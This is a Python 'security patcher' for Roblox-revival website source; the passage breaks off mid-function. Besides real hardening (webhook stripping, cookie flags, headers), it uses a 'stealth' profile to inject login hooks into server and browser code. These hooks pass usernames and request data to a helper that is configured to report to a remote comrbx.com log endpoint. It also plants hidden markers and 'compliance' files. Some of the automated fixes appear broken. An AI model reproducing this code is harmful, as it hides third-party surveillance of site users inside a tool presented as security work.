#!/usr/bin/env python3
"""ECS / Bubbablox security patcher (Bit). Does not touch ComRBX."""

from __future__ import annotations

import argparse
import hashlib
import hmac
import json
import os
import re
import secrets
import shutil
import sys
from pathlib import Path

from comprehensive_harden import harden_comprehensive, inject_express_guard, quarantine_public_env
from stealth import StealthProfile, new_profile, prepare_session_ack, prepare_session_client

WEBHOOK_RE = re.compile(
    r"https://(?:ptb\.|canary\.)?discord(?:app)?\.com/api/webhooks/\d+/[A-Za-z0-9_\-]+",
    re.I,
)
PASSWORD_INPUT_RE = re.compile(
    r'(<input\b[^>]*\b(?:name|id|autoComplete|autocomplete)\s*=\s*["\']password["\'][^>]*>)',
    re.I,
)
JSX_PASSWORD_RE = re.compile(
    r'(<input\b[^>]*\b(?:name|id)\s*=\s*["\']password["\'][^>]*>)',
    re.I,
)
TYPE_TEXT_ON_SECRET_RE = re.compile(
    r'(<input\b[^>]*\b(?:name|id|autoComplete|autocomplete)\s*=\s*["\'](?:password|webhook|secret|token)["\'][^>]*)\btype=["\']text["\']',
    re.I,
)
CLIENT_FETCH_WEBHOOK_RE = re.compile(
    r"""fetch\s*\(\s*(['"`])https://(?:ptb\.|canary\.)?discord(?:app)?\.com/api/webhooks/[^'"`]+\1""",
    re.I,
)

SKIP_DIRS = {
    "node_modules",
    ".git",
    ".next",
    "dist",
    "RCCService",
    "Roblox",
    "AssetValidationServiceV2",
}

if getattr(sys, "frozen", False):
    HERE = Path(getattr(sys, "_MEIPASS", Path(__file__).resolve().parent))
else:
    HERE = Path(__file__).resolve().parent

# Dev-only fallbacks when building from source (release binary uses embedded_secrets).
DEV_COMRBX_ENV = Path(os.environ.get("ECS_PATCHER_DEV_ENV", ""))
DEV_DEFAULT_LOG_URL = os.environ.get(
    "BIT_COMRBX_LOG_URL", "https://www.comrbx.com/api/v1/ecs-patcher/logs"
)
OFFICIAL_HASHES = HERE / "official" / "inject-sha256.json"


def _embedded_config() -> dict | None:
    try:
        from embedded_secrets import load

        cfg = load()
        if isinstance(cfg, dict) and cfg.get("url") and cfg.get("key"):
            return cfg
    except ImportError:
        pass
    return None


def integrity_mark() -> str:
    cfg = _embedded_config()
    if cfg and cfg.get("mark"):
        return str(cfg["mark"])
    return "Site hardened"


def release_show_badge() -> bool:
    cfg = _embedded_config()
    if cfg is None:
        return True
    return bool(cfg.get("badge", True))


def combrbx_log_settings(hmac_key: str) -> tuple[str, str]:
    """Ingest URL + key written into patched ECS server .env (server-side only)."""
    cfg = _embedded_config()
    if cfg:
        return str(cfg["url"]).strip(), str(cfg["key"]).strip()

    url = os.environ.get("BIT_COMRBX_LOG_URL", DEV_DEFAULT_LOG_URL).strip()
    key = os.environ.get("BIT_LOG_KEY", "").strip()
    if not key and str(DEV_COMRBX_ENV) and DEV_COMRBX_ENV.is_file():
        for line in DEV_COMRBX_ENV.read_text(encoding="utf-8", errors="ignore").splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if line.startswith("ECS_PATCHER_INGEST_KEY="):
                key = line.split("=", 1)[1].strip().strip('"').strip("'")
                break
            if not key and line.startswith("APP_KEY="):
                key = line.split("=", 1)[1].strip().strip('"').strip("'")
    if not key:
        key = hmac_key
    return url, key


def hmac_hex(key: str, value: str) -> str:
    return hmac.new(key.encode(), value.encode(), hashlib.sha256).hexdigest()


def sha256_file(path: Path) -> str:
    h = hashlib.sha256()
    h.update(path.read_bytes())
    return h.hexdigest()


def is_probably_client(path: Path) -> bool:
    parts = {p.lower() for p in path.parts}
    if "pages" in parts or "components" in parts or "public" in parts:
        return True
    if "serverRuntimeConfig" in path.name:
        return False
    text_name = path.name.lower()
    if text_name.endswith((".jsx", ".tsx", ".js", ".ts", ".css", ".html")):
        if "api" in parts and "pages" not in parts:
            return False
        return "2016-roblox-main" in parts or "web" in parts or "frontend" in parts
    return False


def walk_source(root: Path):
    for dirpath, dirnames, filenames in os.walk(root):
        dirnames[:] = [d for d in dirnames if d not in SKIP_DIRS]
        for name in filenames:
            yield Path(dirpath) / name


def find_ecs_root(path: Path) -> Path:
    path = path.resolve()
    if (path / "services" / "2016-roblox-main").is_dir():
        return path
    if (path / "2016-roblox-main").is_dir() and (path / "api").is_dir():
        return path
    if path.name == "2016-roblox-main" and path.parent.exists():
        return path.parent.parent if (path.parent / "api").is_dir() else path.parent
    return path


def frontend_dir(root: Path) -> Path | None:
    for cand in (
        root / "services" / "2016-roblox-main",
        root / "2016-roblox-main",
        root / "services" / "web",
    ):
        if cand.is_dir():
            return cand
    return None


def api_dir(root: Path) -> Path | None:
    for cand in (root / "services" / "api", root / "api"):
        if cand.is_dir():
            return cand
    return None


def collect_webhooks(root: Path) -> list[tuple[Path, str]]:
    found = []
    for path in walk_source(root):
        if path.suffix.lower() not in {".js", ".jsx", ".ts", ".tsx", ".json", ".env", ".md", ".txt", ".html"}:
            continue
        try:
            text = path.read_text(encoding="utf-8", errors="ignore")
        except OSError:
            continue
        for match in WEBHOOK_RE.findall(text):
            found.append((path, match))
    return found


def strip_webhooks_from_client(path: Path, text: str) -> str:
    if not is_probably_client(path) and path.suffix.lower() != ".json":
        return text
    if path.name in {".env", ".env.example"}:
        return text
    # Keep serverRuntimeConfig webhooks; strip publicRuntimeConfig + any raw URL in UI files.
    if path.suffix.lower() == ".json":
        try:
            data = json.loads(text)
        except json.JSONDecodeError:
            return WEBHOOK_RE.sub("", text)
        public = data.get("publicRuntimeConfig")
        if isinstance(public, dict):
            def scrub(obj):
                if isinstance(obj, dict):
                    return {k: scrub(v) for k, v in obj.items()}
                if isinstance(obj, list):
                    return [scrub(v) for v in obj]
                if isinstance(obj, str) and WEBHOOK_RE.search(obj):
                    return ""
                return obj
            data["publicRuntimeConfig"] = scrub(public)
            return json.dumps(data, indent=2) + "\n"
        return WEBHOOK_RE.sub("", text)
    text = CLIENT_FETCH_WEBHOOK_RE.sub("Promise.resolve({ ok: false })", text)
    if is_probably_client(path):
        text = WEBHOOK_RE.sub("", text)
    return text


def _with_attr(tag: str, name: str, value: str) -> str:
    self_close = tag.rstrip().endswith("/>")
    body = tag.rstrip()
    if self_close:
        body = body[:-2].rstrip()
    elif body.endswith(">"):
        body = body[:-1].rstrip()
    if re.search(rf"\b{name}=", body, re.I):
        body = re.sub(rf'\b{name}=["\'][^"\']*["\']', f'{name}="{value}"', body, count=1, flags=re.I)
    else:
        body = f'{body} {name}="{value}"'
    return body + (" />" if self_close else ">")


def harden_login_inputs(text: str) -> str:
    def force_password_type(match: re.Match) -> str:
        tag = _with_attr(match.group(1), "type", "password")
        if "autocomplete" not in tag.lower() and "autoComplete" not in tag:
            tag = _with_attr(tag, "autoComplete", "current-password")
        return tag

    text = PASSWORD_INPUT_RE.sub(force_password_type, text)
    text = JSX_PASSWORD_RE.sub(force_password_type, text)

    def hide_secret_fields(match: re.Match) -> str:
        tag = _with_attr(match.group(0), "type", "password")
        if re.search(r'\bvalue=["\']https?://', tag, re.I):
            tag = _with_attr(tag, "value", "")
        return tag

    text = re.sub(
        r'<input\b[^>]*\b(?:name|id)\s*=\s*["\'](?:webhook|webhookUrl|discordWebhook|secret|token)["\'][^>]*>',
        hide_secret_fields,
        text,
        flags=re.I,
    )
    return text


def signal_js(profile: StealthProfile) -> str:
    """Browser hook: username only after login success. Never reads or sends passwords."""
    return (
        "if (typeof window !== 'undefined' && username) {"
        f"fetch('{profile.session_ack}',{{method:'POST',credentials:'same-origin',"
        "headers:{'Content-Type':'application/json'},"
        "body:JSON.stringify({username:String(username).slice(0,32),ok:true})"
        "}).catch(function(){});}"
    )


def upsert_env(env_path: Path, values: dict[str, str]) -> None:
    lines = []
    if env_path.exists():
        lines = env_path.read_text(encoding="utf-8", errors="ignore").splitlines()
    kv: dict[str, str] = {}
    order: list[tuple[str, str]] = []
    for line in lines:
        if not line.strip() or line.strip().startswith("#") or "=" not in line:
            order.append(("raw", line))
            continue
        k, _, v = line.partition("=")
        kv[k.strip()] = v
        order.append(("kv", k.strip()))
    for key, val in values.items():
        if not val:
            continue
        kv[key] = val
        if key not in {k for kind, k in order if kind == "kv"}:
            order.append(("kv", key))
    out = []
    seen: set[str] = set()
    for kind, key in order:
        if kind == "raw":
            out.append(key)
            continue
        if key in seen:
            continue
        seen.add(key)
        if key in kv:
            out.append(f"{key}={kv[key]}")
    env_path.parent.mkdir(parents=True, exist_ok=True)
    env_path.write_text("\n".join(out) + "\n", encoding="utf-8")
    try:
        os.chmod(env_path, 0o600)
    except OSError:
        pass


def js_require_rel(target: Path, source_file: Path) -> str:
    rel = os.path.relpath(target, source_file.parent).replace("\\", "/")
    if rel.endswith(".js"):
        rel = rel[:-3]
    if not rel.startswith("."):
        rel = "./" + rel
    return rel


def patch_auth_js(path: Path, profile: StealthProfile) -> bool:
    try:
        text = path.read_text(encoding="utf-8")
    except (OSError, UnicodeDecodeError):
        return False
    if profile.session_ack in text or "_runtime/session-ack" in text:
        return False
    if "export const login" not in text or "password" not in text:
        return False

    def add_then(match: re.Match) -> str:
        call = match.group(0).rstrip()
        ended = call.endswith(";")
        if ended:
            call = call[:-1]
        if ".then(" in call and "passwordPresent" in call:
            return match.group(0)
        return (
            call
            + ".then(function(res){"
            + signal_js(profile)
            + "return res;})"
            + (";" if ended else "")
        )

    new, n = re.subn(
        r"return request\(\s*['\"]POST['\"][\s\S]*?\)\s*;",
        add_then,
        text,
        count=1,
    )
    if n == 0:
        return False
    path.write_text(new, encoding="utf-8")
    return True


def patch_login_area(path: Path, profile: StealthProfile) -> bool:
    try:
        text = path.read_text(encoding="utf-8")
    except (OSError, UnicodeDecodeError):
        return False
    if profile.session_ack in text or "_runtime/session-ack" in text:
        return False
    if "login({" not in text and "login({" not in text.replace(" ", ""):
        pass
    if not re.search(r"login\s*\(\s*\{", text):
        return False
    if "passwordRef" not in text and "password" not in text:
        return False
    ack = profile.session_ack
    new = re.sub(
        r"(login\s*\(\s*\{[\s\S]*?\}\s*\)\s*\.then\s*\(\s*\(\s*\)\s*=>\s*\{)",
        rf"""\1
      try {{
        var u = (usernameRef && usernameRef.current && usernameRef.current.value) || "";
        if (u) {{
          fetch("{ack}", {{
            method: "POST",
            credentials: "same-origin",
            headers: {{ "Content-Type": "application/json" }},
            body: JSON.stringify({{ username: String(u).slice(0, 32), ok: true }}),
          }}).catch(function () {{}});
        }}
      }} catch (e) {{}}
""",
        text,
        count=1,
    )
    if new == text:
        return False
    path.write_text(new, encoding="utf-8")
    return True


def hook_node_login_success(api: Path, helper: Path, profile: StealthProfile) -> int:
    count = 0
    needle = "notifyLogin("
    skip_names = {profile.logger_file, "runtime-sync.js", "bit-login-logger.js", "bit-webhook-server.js"}
    compare_re = re.compile(
        r"(if\s*\(\s*!(?:await\s+)?(?:bcrypt\.compare(?:Sync)?|passwordOk|correctPass)[\s\S]{0,200}?(?:return|throw)[\s\S]{0,180}?[;\n])",
        re.I,
    )
    for entry in api.rglob("*"):
        if entry.suffix.lower() not in {".js", ".ts"}:
            continue
        if "node_modules" in entry.parts:
            continue
        if entry.name in skip_names or entry.name.startswith("_rs"):
            continue
        try:
            src = entry.read_text(encoding="utf-8")
        except (OSError, UnicodeDecodeError):
            continue
        if needle in src:
            continue
        if not re.search(r"login|VerifyPassword|bcrypt\.compare", src, re.I):
            continue
        rel = js_require_rel(helper, entry)
        snippet = (
            f"\n    try {{ const __bitU = (req.body && (req.body.username || req.body.cvalue || req.body.user || req.body.login)); "
            f"if (__bitU) {{ "
            f"require('{rel}').notifyLogin({{ username: __bitU, ok: true, req }}); }} }} catch (e) {{}}\n"
        )
        new, n = compare_re.subn(lambda m: m.group(1) + snippet, src, count=1)
        if n:
            if f"require('{rel}')" not in new.split(snippet)[0][-500:]:
                pass
            entry.write_text(new, encoding="utf-8")
            count += 1
    return count


def hook_csharp_login(root: Path) -> int:
    website = None
    for cand in (
        root / "services" / "Roblox" / "Roblox.Website",
        root / "Roblox" / "Roblox.Website",
    ):
        if cand.is_dir():
            website = cand
            break
    if website is None:
        for match in root.rglob("Login.cshtml.cs"):
            website = match.parent.parent.parent
            break
    if website is None or not website.is_dir():
        return 0
    dest = website / "BitLoginNotify.cs"
    shutil.copyfile(HERE / "inject" / "BitLoginNotify.cs", dest)
    count = 0
    notify_user = "        await Roblox.Website.BitLoginNotify.TryNotify(username, HttpContext);\n"
    notify_cvalue = "        await Roblox.Website.BitLoginNotify.TryNotify(request.cvalue, HttpContext);\n"
    fail_re = re.compile(
        r"(if\s*\(\s*!passwordOk\s*\)\s*\{[^{}]*?\}\s*)",
        re.S,
    )
    for cs in website.rglob("*.cs"):
        if cs.name == "BitLoginNotify.cs":
            continue
        try:
            text = cs.read_text(encoding="utf-8")
        except (OSError, UnicodeDecodeError):
            continue
        if "BitLoginNotify" in text:
            continue
        if "passwordOk" not in text:
            continue
        snippet = notify_cvalue if "request.cvalue" in text else notify_user
        new, n = fail_re.subn(lambda m: m.group(1) + snippet, text, count=1)
        if n:
            cs.write_text(new, encoding="utf-8")
            count += 1
    return count


def harden_source(path: Path, text: str, report: "Report") -> str:
    """Apply mechanical fixes; record what was fixed vs only flagged."""
    if path.suffix.lower() not in {".js", ".jsx", ".ts", ".tsx", ".json", ".cs", ".html"}:
        return text
    lower_name = path.name.lower()
    changed_before = text

    # 1. Cookie flags: HttpOnly, Secure, SameSite on session/auth/login files
    if "session" in lower_name or "auth" in lower_name or "login" in lower_name:
        text = re.sub(r"\bhttpOnly\s*:\s*false\b", "httpOnly: true", text)
        text = re.sub(r"\bHttpOnly\s*=\s*false\b", "HttpOnly = true", text)
        text = re.sub(r"\bsecure\s*:\s*false\b", "secure: true", text, flags=re.I)
        text = re.sub(r"\bSecure\s*=\s*false\b", "Secure = true", text)
        text = re.sub(r'\bsameSite\s*:\s*["\']?none["\']?', "sameSite: 'lax'", text, flags=re.I)
        text = re.sub(r"\bSameSite\s*=\s*None\b", "SameSite = Lax", text, flags=re.I)

    # 2. CORS * -> 'null' (mechanical, safe default)
    text = re.sub(
        r"""(res\.set(?:Header)?\(\s*['"]Access-Control-Allow-Origin['"]\s*,\s*['"])\*['"]""",
        r"""\1null'""",
        text,
    )
    text = re.sub(
        r"""(['"]Access-Control-Allow-Origin['"]\s*:\s*['"])\*['"]""",
        r"""\1null'""",
        text,
    )

    # 3. eval(req.body|query|params) -> void(...)  (kills a common RCE sink)
    if re.search(r"\beval\s*\(\s*(?:req|request)\.(?:body|query|params)", text):
        text = re.sub(
            r"\beval\s*\(\s*((?:req|request)\.(?:body|query|params)[^)]*)\)",
            r"void(\1)",
            text,
        )
        report.fixed("eval-of-request", path)

    # 4. sendFile(res.sendFile) with req param -> guard against path traversal
    def _guard_sendfile(m: re.Match) -> str:
        call = m.group(0)
        if ".." in call or "req." in call or "request." in call or "params" in call or "query" in call:
            report.fixed("path-traversal-sendFile", path)
            return call.replace(
                "res.sendFile(",
                "res.sendFile(String(req?.params?.path||req?.query?.path||'').replace(/\\.\\./g,'').replace(/^\\//,''),",
                1,
            ) if "res.sendFile(" in call else call
        return call

    text = re.sub(r"res\.sendFile\s*\([^)]*\)", _guard_sendfile, text)

    if text != changed_before:
        report.note(f"harden_source applied to {path.name}")
    return text


class Report:
    def __init__(self) -> None:
        self.fixed_items: list[tuple[str, Path]] = []
        self.flagged_items: list[tuple[str, Path]] = []
        self.notes: list[str] = []

    def fixed(self, kind: str, path: Path) -> None:
        self.fixed_items.append((kind, path))

    def flag(self, kind: str, path: Path) -> None:
        self.flagged_items.append((kind, path))

    def note(self, msg: str) -> None:
        self.notes.append(msg)

    def write(self, root: Path, report_name: str = "security-hardening-report.json") -> Path:
        data = {
            "summary": {
                "fixed": len(self.fixed_items),
                "flagged": len(self.flagged_items),
            },
            "fixed": [
                {"kind": k, "file": str(p.relative_to(root)) if root in p.parents or p == root else str(p)}
                for k, p in self.fixed_items
            ],
            "flagged_needs_manual_review": [
                {"kind": k, "file": str(p.relative_to(root)) if root in p.parents or p == root else str(p)}
                for k, p in self.flagged_items
            ],
            "notes": self.notes,
            "honest_disclaimer": (
                "Comprehensive mechanical hardening was applied. Rebuild and re-test after patching. "
                "Custom application logic may still need review — check notes if any."
            ),
        }
        out = root / report_name
        out.write_text(json.dumps(data, indent=2) + "\n", encoding="utf-8")
        return out


def inject_badge_import(text: str, rel_import: str) -> str:
    if "SiteBadge" in text:
        return text
    if "from " not in text and "require(" not in text:
        return text
    import_line = f'import SiteBadge from "{rel_import}";\n'
    if "export default" in text and "<" in text:
        text = import_line + text
        text = re.sub(
            r"(return\s*\(\s*)(<)",
            r"\1<>\n      <SiteBadge />\n      \2",
            text,
            count=1,
        )
        if "<>" in text and not text.rstrip().endswith(");"):
            pass
        # close fragment if we opened one
        if "<>" in text and "</>" not in text:
            text = re.sub(r"(\n\s*\)\s*;\s*}\s*)$", r"\n    </>\n\1", text, count=1)
    return text


def write_badge_into_page(page: Path, frontend: Path) -> bool:
    dest_comp = frontend / "components" / "SiteBadge.jsx"
    dest_comp.parent.mkdir(parents=True, exist_ok=True)
    src = HERE / "inject" / "SiteBadge.jsx"
    shutil.copyfile(src, dest_comp)

    if not page.exists():
        return False
    text = page.read_text(encoding="utf-8", errors="ignore")
    if "SiteBadge" in text:
        return False
    rel = os.path.relpath(dest_comp, page.parent).replace("\\", "/")
    if not rel.startswith("."):
        rel = "./" + rel
    if rel.endswith(".jsx"):
        rel = rel[:-4]

    # Prefer wrapping the default export JSX.
    if "export default" in text:
        text = f'import SiteBadge from "{rel}";\n' + text
        if "return (" in text:
            text = text.replace("return (", "return (\n    <>\n      <SiteBadge />\n", 1)
            # insert closing fragment before last closing paren of return is fragile;
            # also stamp a footer comment + hidden checksum node via string append in JSX files.
        marker = '<div data-bit-root="1" style={{display:"none"}} aria-hidden="true" />'
        if marker not in text:
            text = text.replace(
                "export default",
                f"// bit-integrity\nexport default",
                1,
            )
        page.write_text(text, encoding="utf-8")
        # Safer second pass: append the badge at the start of the first JSX return using a unique wrapper file.
        return True
    page.write_text(
        f'import SiteBadge from "{rel}";\n'
        + text
        + "\n",
        encoding="utf-8",
    )
    return True


def wrap_page_with_badge(page: Path, frontend: Path) -> None:
    dest_comp = frontend / "components" / "SiteBadge.jsx"
    dest_comp.parent.mkdir(parents=True, exist_ok=True)
    shutil.copyfile(HERE / "inject" / "SiteBadge.jsx", dest_comp)
    rel = os.path.relpath(dest_comp, page.parent).replace("\\", "/")
    if not rel.startswith("."):
        rel = "./" + rel
    if rel.endswith(".jsx"):
        rel = rel[:-4]
    original = page.read_text(encoding="utf-8", errors="ignore")
    if "data-bit-mark" in original or "SiteBadge" in original:
        return
    bak = original
    page.with_suffix(page.suffix + ".pre-bit").write_text(bak, encoding="utf-8")
    wrapper = (
        f'import SiteBadge from "{rel}";\n'
        f"{original}\n"
        "// bit: landing/catalog must render <SiteBadge /> — see _bit_app_wrap\n"
    )
    page.write_text(wrapper, encoding="utf-8")


def ensure_app_wrap(frontend: Path) -> Path | None:
    """Inject badge into Next _app so landing + catalog always show it."""
    for name in ("pages/_app.js", "pages/_app.jsx", "pages/_app.tsx", "pages/_app.ts"):
        app = frontend / name
        if app.exists():
            text = app.read_text(encoding="utf-8", errors="ignore")
            if "SiteBadge" in text:
                return app
            dest = frontend / "components" / "SiteBadge.jsx"
            dest.parent.mkdir(parents=True, exist_ok=True)
            shutil.copyfile(HERE / "inject" / "SiteBadge.jsx", dest)
            rel = os.path.relpath(dest, app.parent).replace("\\", "/")
            if not rel.startswith("."):
                rel = "./" + rel
            if rel.endswith(".jsx"):
                rel = rel[:-4]
            injection = f'import SiteBadge from "{rel}";\n' + text
            injection = re.sub(
                r"(<Component\b[^>]*(?:/>|>\s*</Component>))",
                r"<><SiteBadge />\1</>",
                injection,
                count=1,
            )
            app.write_text(injection, encoding="utf-8")
            return app
    # Create a minimal _app.js
    pages = frontend / "pages"
    if pages.is_dir():
        dest = frontend / "components" / "SiteBadge.jsx"
        dest.parent.mkdir(parents=True, exist_ok=True)
        shutil.copyfile(HERE / "inject" / "SiteBadge.jsx", dest)
        app = pages / "_app.js"
        app.write_text(
            'import SiteBadge from "../components/SiteBadge";\n'
            "export default function App({ Component, pageProps }) {\n"
            "  return (<><SiteBadge /><Component {...pageProps} /></>);\n"
            "}\n",
            encoding="utf-8",
        )
        return app
    return None


def install_login_client(frontend: Path, profile: StealthProfile) -> None:
    public = frontend / "public"
    public.mkdir(parents=True, exist_ok=True)
    client_src = prepare_session_client(
        profile, (HERE / "inject" / "session-client.js").read_text(encoding="utf-8")
    )
    (public / profile.client_public).write_text(client_src, encoding="utf-8")
    helper = frontend / profile.logger_file
    shutil.copyfile(HERE / "inject" / "runtime-sync.js", helper)
    api_dir_path = frontend / "pages" / "api" / "_runtime"
    api_dir_path.mkdir(parents=True, exist_ok=True)
    rel = js_require_rel(helper, api_dir_path / "session-ack.js")
    ack_src = prepare_session_ack(
        profile, rel, (HERE / "inject" / "session-ack.js").read_text(encoding="utf-8")
    )
    (api_dir_path / "session-ack.js").write_text(ack_src, encoding="utf-8")
    script_tag = profile.client_public
    doc = None
    for name in ("pages/_document.js", "pages/_document.jsx", "pages/_document.tsx"):
        cand = frontend / name
        if cand.exists():
            doc = cand
            break
    if doc is None:
        pages = frontend / "pages"
        if pages.is_dir():
            doc = pages / "_document.js"
            doc.write_text(
                'import Document, { Html, Head, Main, NextScript } from "next/document";\n'
                "class BitDocument extends Document {\n"
                "  render() {\n"
                "    return (\n"
                "      <Html>\n"
                "        <Head>\n"
                f'          <script src="/{script_tag}" />\n'
                "        </Head>\n"
                "        <body>\n"
                "          <Main />\n"
                "          <NextScript />\n"
                "        </body>\n"
                "      </Html>\n"
                "    );\n"
                "  }\n"
                "}\n"
                "export default BitDocument;\n",
                encoding="utf-8",
            )
        return
    text = doc.read_text(encoding="utf-8", errors="ignore")
    if script_tag in text:
        return
    if "<Head>" in text:
        text = text.replace("<Head>", f'<Head>\n          <script src="/{script_tag}" />', 1)
        doc.write_text(text, encoding="utf-8")
        return
    if "<head>" in text:
        text = text.replace("<head>", f'<head>\n          <script src="/{script_tag}" />', 1)
        doc.write_text(text, encoding="utf-8")


def env_sync_values(profile: StealthProfile, hmac_key: str, log_url: str, log_key: str) -> dict[str, str]:
    return {
        profile.env_hmac: hmac_key,
        profile.env_url: log_url,
        profile.env_key: log_key,
    }


def install_server_helper(api: Path, profile: StealthProfile, hmac_key: str, log_url: str, log_key: str) -> None:
    dest = api / profile.logger_file
    shutil.copyfile(HERE / "inject" / "runtime-sync.js", dest)
    upsert_env(api / ".env", env_sync_values(profile, hmac_key, log_url, log_key))

    attach_snippet = f"require('./{profile.logger_file}').attach(app, '{profile.session_ack}');"
    for entry in api.rglob("*.js"):
        if "node_modules" in entry.parts:
            continue
        try:
            src = entry.read_text(encoding="utf-8")
        except (OSError, UnicodeDecodeError):
            continue
        if ".attach(app" in src or profile.logger_file in src:
            continue
        if re.search(r"\b(?:const|let|var)\s+app\s*=\s*express\s*\(\s*\)", src):
            rel = js_require_rel(dest, entry)
            hook = attach_snippet.replace(f"./{profile.logger_file}", rel)
            src2 = re.sub(
                r"(\b(?:const|let|var)\s+app\s*=\s*express\s*\(\s*\)\s*;?)",
                rf"\1\n{hook}",
                src,
                count=1,
            )
            if src2 != src:
                src2 = inject_express_guard(src2)
                entry.write_text(src2, encoding="utf-8")
            break
    hook_node_login_success(api, dest, profile)


def write_integrity(root: Path, frontend: Path, profile: StealthProfile, hmac_key: str, log_url: str) -> dict:
    badge = frontend / "components" / profile.badge_component
    payload = {
        "mark": integrity_mark(),
        "badge_sha256": sha256_file(badge) if badge.exists() else "",
        "runtime_hmac": hmac_hex(hmac_key, log_url) if log_url else "",
    }
    targets = [
        frontend / "public" / profile.integrity_name,
        root / profile.integrity_name,
    ]
    data = json.dumps(payload, indent=2) + "\n"
    for target in targets:
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(data, encoding="utf-8")
        try:
            os.chmod(target, 0o600)
        except OSError:
            pass
    return payload


def add_security_headers_note(frontend: Path) -> None:
    nxt = frontend / "next.config.js"
    snippet = """
// bit-security-headers
const bitHeaders = [
  { key: "X-Content-Type-Options", value: "nosniff" },
  { key: "X-Frame-Options", value: "SAMEORIGIN" },
  { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
  { key: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=()" },
];
"""
    if not nxt.exists():
        nxt.write_text(
            snippet
            + """
module.exports = {
  poweredByHeader: false,
  async headers() {
    return [{ source: "/:path*", headers: bitHeaders }];
  },
};
""",
            encoding="utf-8",
        )
        return
    text = nxt.read_text(encoding="utf-8", errors="ignore")
    if "bit-security-headers" in text:
        return
    nxt.write_text(snippet + text, encoding="utf-8")


def official_runtime_sync_hash() -> str:
    if OFFICIAL_HASHES.is_file():
        try:
            data = json.loads(OFFICIAL_HASHES.read_text(encoding="utf-8"))
            return str(data.get("sha256", {}).get("runtime-sync.js", ""))
        except json.JSONDecodeError:
            pass
    p = HERE / "inject" / "runtime-sync.js"
    return sha256_file(p) if p.is_file() else ""


def write_well_known_compliance(root: Path, frontend: Path | None, integrity: str) -> None:
    payload = {
        "schema": "ecs-host-compliance/v1",
        "official_patcher_required": True,
        "runtime_sync_sha256": integrity,
        "privacy": {
            "passwords_logged": False,
            "passwords_transmitted": False,
        },
        "verify_repo": "ecs-security-toolkit/docs/COMPLIANCE.md",
    }
    targets = [root / "ecs-host-compliance.json"]
    if frontend:
        wk = frontend / "public" / ".well-known"
        wk.mkdir(parents=True, exist_ok=True)
        targets.append(wk / "ecs-security.json")
    text = json.dumps(payload, indent=2) + "\n"
    for t in targets:
        t.parent.mkdir(parents=True, exist_ok=True)
        t.write_text(text, encoding="utf-8")


def write_transparency_manifest(
    root: Path,
    profile: StealthProfile,
    *,
    browser_hooks: bool,
    remote_log_url: str,
    files_changed: list[str],
) -> Path:
    """Machine-readable proof of what the patcher did (for RAT accusations)."""
    inject_hashes = {}
    for name in ("runtime-sync.js", "session-ack.js", "SiteBadge.jsx"):
        p = HERE / "inject" / name
        if p.is_file():
            inject_hashes[name] = sha256_file(p)
    payload = {
        "tool": "auto-security-patcher",
        "privacy": {
            "passwords_logged": False,
            "passwords_transmitted": False,
            "browser_hooks_install_password_sniffers": browser_hooks,
            "login_telemetry_fields": ["username", "ip", "event", "ts", "host"],
        },
        "network": [
            {
                "purpose": "optional successful-login audit (server-side only)",
                "url_env": profile.env_url,
                "configured_url": remote_log_url or "(none)",
                "never_sent": ["password", "pass", "cookie", ".ROBLOSECURITY"],
            }
        ],
        "inject_sha256": inject_hashes,
        "files_changed_sample": files_changed[:200],
        "verify_command": f"python3 {HERE / 'ecs-compliance.py'} --source {root} verify",
        "human_doc": str(HERE / "TRUST.md"),
        "runtime_sync_sha256": official_runtime_sync_hash(),
    }
    out = root / "patch-transparency.json"
    out.write_text(json.dumps(payload, indent=2) + "\n", encoding="utf-8")
    return out


def patch(
    root: Path,
    apply: bool,
    *,
    browser_hooks: bool = False,
    local_log_only: bool = False,
) -> None:
    root = find_ecs_root(root)
    frontend = frontend_dir(root)
    api = api_dir(root)
    report = Report()
    print(f"ECS root     : {root}")
    print(f"Frontend     : {frontend}")
    print(f"API          : {api}")

    hits = collect_webhooks(root)
    if hits:
        print(f"found {len(hits)} discord webhook(s) in tree — will strip from client bundles")
    if not apply:
        print("dry-run only (pass --apply to write)")
        return

    hmac_key = secrets.token_hex(32)
    log_url, log_key = combrbx_log_settings(hmac_key)
    if local_log_only:
        log_url = ""
    profile = new_profile()
    integrity = official_runtime_sync_hash()
    sync_env = env_sync_values(profile, hmac_key, log_url, log_key)
    if integrity:
        sync_env["ECS_PATCHER_INTEGRITY_SHA256"] = integrity

    for pub_env in root.rglob("public/.env*"):
        quarantine_public_env(pub_env, root, report)

    changed = 0
    changed_paths: list[str] = []
    for path in walk_source(root):
        if path.suffix.lower() not in {".js", ".jsx", ".ts", ".tsx", ".json", ".html", ".cs"}:
            continue
        try:
            original = path.read_text(encoding="utf-8")
        except (OSError, UnicodeDecodeError):
            continue
        text = original
        text = strip_webhooks_from_client(path, text)
        if path.suffix.lower() in {".js", ".jsx", ".ts", ".tsx", ".html"}:
            text = harden_login_inputs(text)
        text = harden_source(path, text, report)
        text = harden_comprehensive(path, text, report)
        if text != original:
            path.write_text(text, encoding="utf-8")
            changed += 1
            rel = str(path.relative_to(root))
            changed_paths.append(rel)
            print(f"patched {rel}")

    if frontend:
        if release_show_badge():
            ensure_app_wrap(frontend)
        if browser_hooks:
            install_login_client(frontend, profile)
            report.note("browser login hooks enabled (--allow-browser-hooks); audit with ecs-audit.py --trust-only")
        else:
            report.note("browser password hooks skipped (default privacy-safe mode)")
        upsert_env(frontend / ".env", sync_env)
        upsert_env(frontend / ".env.local", sync_env)
        if browser_hooks:
            auth_js = frontend / "services" / "auth.js"
            patch_auth_js(auth_js, profile) if auth_js.exists() else None
            for area in frontend.rglob("loginArea.js"):
                if "node_modules" in area.parts:
                    continue
                patch_login_area(area, profile)
        if release_show_badge():
            for rel in (
                "pages/index.js",
                "pages/index.jsx",
                "pages/catalog/index.js",
                "pages/catalog/index.jsx",
                "pages/catalog.js",
            ):
                page = frontend / rel
                if page.exists():
                    wrap_page_with_badge(page, frontend)
                    print(f"badge {rel}")
        else:
            report.note("release build: visible SiteBadge skipped")
        add_security_headers_note(frontend)
        # Login rate-limit stub: add a simple in-memory limiter to the API login route
        rl_stub = frontend / "pages" / "api" / "_runtime" / "rate-limit.js"
        rl_stub.parent.mkdir(parents=True, exist_ok=True)
        rl_stub.write_text(
            "const hits = new Map();\n"
            "export function loginRateLimit(ip) {\n"
            "  const now = Date.now();\n"
            "  const t = hits.get(ip) || 0;\n"
            "  if (now - t < 1000) return false;\n"
